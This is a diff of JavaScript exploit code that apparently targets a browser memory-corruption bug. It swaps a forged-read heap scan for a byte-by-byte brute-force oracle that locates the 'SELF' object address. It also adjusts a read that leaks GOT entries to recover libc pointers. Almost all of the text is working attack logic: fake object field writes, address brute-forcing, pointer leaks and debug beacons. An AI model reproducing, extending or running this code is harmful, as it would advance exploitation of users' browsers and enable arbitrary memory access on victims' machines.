@@ -308,68 +308,33 @@ function phase(){
           }
         }
 
-        /* --- forgeRead SELF scan: safe (returns "normal" for wrong candidates) --- */
+        /* --- Oracle PH3: proven 20% hit rate, byte-component scan --- */
         if(!selfFound){
-          var snap3=new Uint8Array(SIZE);
-          for(var js3=0;js3<SIZE;js3++)snap3[js3]=bufs[0][0][js3];
-          var l1hex=L1.toString(16).padStart(16,'0').match(/../g).reverse().join('');
-          function tryS3(sc){
-            var vb=bufs[0][0];
-            for(var r=0;r<SIZE;r++)vb[r]=snap3[r];
-            put64(vb,0x08,sc+0x70n);vb[0x10]=0;
-            put32(vb,0x30,4);put32(vb,0x34,8);put64(vb,0x38,sc+0x58n);put32(vb,0x40,4);
-            vb[0x44]=0x7A;vb[0x45]=0x7A;vb[0x46]=0x71;
-            put32(vb,0x70,4);put32(vb,0x74,0x10);vb[0x78]=14;vb[0x79]=0;
-            put64(vb,0x7A,sc+0x90n);put32(vb,0x90,3);put32(vb,0x94,72);put64(vb,0x98,sc+0x30n);
-            try{return dec(String(faces[zi].style),128);}catch(e){return 'ERR';}
-          }
-          function restS3(){var vb=bufs[0][0];for(var r=0;r<SIZE;r++)vb[r]=snap3[r];}
-          /* forgeRead SELF scan: flat 0xC0 steps, check every 10th for speed */
-          var midS=(L1<L2?(L1+L2)/2n:(L2+L1)/2n);
-          var centerS=((midS/0xC0n)*0xC0n); /* object-aligned */
-          var maxRange=0x400000n,OBJ=0xC0n;
-          var n3=0,hitRegion=0n;
-          bs('PH3F-START-center='+hex(centerS));
-          /* Phase A: coarse scan downward (every 10th object = ~2KB steps) */
-          for(var dA=OBJ;!selfFound&&dA<maxRange;dA+=OBJ*10n){
-            var cA=centerS-dA;
-            if(cA<0x1000000000n)break;
-            n3++;
-            var rA=tryS3(cA);restS3();
-            if(rA!=='6e6f726d616c'&&rA!=='ERR'&&rA.length>=16){
-              /* Found non-normal at cA — check if it's SELF */
-              if(rA.indexOf(l1hex)===0){self=cA;selfFound=true;bs('SELF-FR-'+hex(self)+'-n='+n3);}
-              else{hitRegion=cA;bs('PH3F-HIT-'+hex(cA)+'-data='+rA.slice(0,32));}
-            }
-            if((n3%100)===0)b('PH3F-'+n3);
-          }
-          /* Phase A2: coarse scan upward */
-          if(!selfFound&&hitRegion===0n){
-            for(var dB=OBJ;!selfFound&&dB<maxRange;dB+=OBJ*10n){
-              var cB=centerS+dB;
-              n3++;
-              var rB=tryS3(cB);restS3();
-              if(rB!=='6e6f726d616c'&&rB!=='ERR'&&rB.length>=16){
-                if(rB.indexOf(l1hex)===0){self=cB;selfFound=true;bs('SELF-FR-'+hex(self)+'-n='+n3);}
-                else{hitRegion=cB;bs('PH3F-HIT-'+hex(cB)+'-data='+rB.slice(0,32));}
-              }
-              if((n3%100)===0)b('PH3F-'+n3);
-            }
-          }
-          /* Phase B: fine scan around hit region (±10 objects) */
-          if(!selfFound&&hitRegion>0n){
-            for(var dC=-10n;!selfFound&&dC<=10n;dC+=1n){
-              var cC=hitRegion+dC*OBJ;
-              if(cC<0x1000000000n)continue;
-              n3++;
-              var rC=tryS3(cC);restS3();
-              if(rC!=='6e6f726d616c'&&rC!=='ERR'&&rC.length>=16){
-                if(rC.indexOf(l1hex)===0){self=cC;selfFound=true;bs('SELF-FR-'+hex(self)+'-n='+n3);}
+          var l1b2=Number((L1>>16n)&0xFFn),l2b2=Number((L2>>16n)&0xFFn);
+          var b2Mid=Math.round((l1b2+l2b2)/2);
+          var b2Ref=(found>0n)?Number((found>>16n)&0xFFn):b2Mid;
+          var B4s=[0x10];
+          b('PH3-RANGE-b2ref='+b2Ref+',l1b2='+l1b2+',l2b2='+l2b2);
+          var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
+          b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
+          var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);
+          var n3=0;
+          b('PH3-START-b4='+B4s[0]+',st='+bufs[0][0][0x82]+',sz='+bufs[0][0][0x2C]);
+          for(var i8=0;i8<B4s.length&&!selfFound;i8++){
+            for(var i7=0;i7<b2s.length&&!selfFound;i7++){
+              var winB2=b2s[i7];
+              for(var q7=0;q7<0x7F&&!selfFound;q7++){
+                for(var i6=0;i6<b0a.length&&!selfFound;i6++){
+                  var sc=BigInt(b0a[i6])|(BigInt(q7)<<8n)|(BigInt(winB2)<<16n)|(BigInt(B4s[i8])<<32n);
+                  setR(sc+0x38n);n3++;
+                  if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                    self=sc;selfFound=true;
+                  }
+                  if((n3%512)===0)b('PH3-'+n3);
+                }
               }
             }
           }
-          restS3();
-          if(!selfFound)b('PH3F-NOSELF-n='+n3);
         }
 
         if(!selfFound){b('NOSELF');try{localStorage.removeItem('p691_s3');}catch(e){}verd('bad','NOSELF');return;}
@@ -499,7 +464,7 @@ function phase(){
                 h4='COMPUTED';
 
                 /* W4b: read .data near VP for GOT entries (libc pointers) */
-                var gotData='',gotAddr=VP+0x1000n;
+                var gotData='',gotAddr=VP+0x2000n; /* before PLT stubs — resolved GOT entries? */
                 restoreAndForge(snap2,gotAddr,64);
                 try{gotData=dec(String(faces[zi].style),128);}catch(e){gotData='ERR';}
               }
